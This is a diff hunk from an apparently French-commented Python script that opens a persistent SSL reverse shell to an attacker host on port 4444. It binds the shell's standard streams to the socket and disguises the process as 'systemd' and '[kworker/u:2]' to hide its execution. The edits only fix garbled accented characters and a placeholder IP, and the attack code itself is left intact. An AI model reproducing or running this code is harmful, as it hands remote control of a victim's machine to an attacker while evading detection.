@@ -6,25 +6,25 @@ import base64
 import time
 import sys
 
-ATTACKER_IP = "ip"
+ATTACKER_IP = "Ip"
 ATTACKER_PORT = 4444
-RETRY_DELAY = 5  # Temps d'attente avant de rÃ©essayer
+RETRY_DELAY = 5  # Temps d'attente avant de réessayer
 
 def connect():
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock = ssl.wrap_socket(sock)  # SÃ©curise la connexion avec SSL
+            sock = ssl.wrap_socket(sock)  # Sécurise la connexion avec SSL
             sock.connect((ATTACKER_IP, ATTACKER_PORT))
 
             os.dup2(sock.fileno(), 0)
             os.dup2(sock.fileno(), 1)
             os.dup2(sock.fileno(), 2)
 
-            # Changer le nom du processus pour masquer son exÃ©cution
+            # Changer le nom du processus pour masquer son exécution
             try:
                 os.system("echo -ne '\\033]0;systemd\\007'")  # Change le titre du terminal
-                sys.argv[0] = "[kworker/u:2]"  # Modifie le nom affichÃ© dans les processus
+                sys.argv[0] = "[kworker/u:2]"  # Modifie le nom affiché dans les processus
             except Exception:
                 pass
 
